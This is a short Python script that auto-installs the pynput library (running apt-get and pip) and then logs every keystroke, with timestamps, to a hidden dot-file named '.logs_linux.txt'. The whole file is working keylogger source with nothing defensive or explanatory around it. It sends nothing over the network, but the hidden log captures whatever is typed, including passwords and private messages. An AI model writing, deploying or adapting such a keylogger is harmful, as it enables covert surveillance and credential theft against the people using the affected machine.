#!/usr/bin/python
import sys
from subprocess import check_call

# Verify if pip is installed
try:
     import pip
     
except ImportError:
     print("Pip not present.")
     check_call(['apt-get', 'install', '-y', 'python3-pip'])      
     
# Install the package pynput
check_call([sys.executable, '-m', 'pip', 'install','pynput'])

from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(handlers=[logging.FileHandler(filename=".logs_linux.txt", encoding='utf-8')], level=logging.INFO, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    if str(key) == '<65027>':
        logging.info("Key.altgr")
    else:
        logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
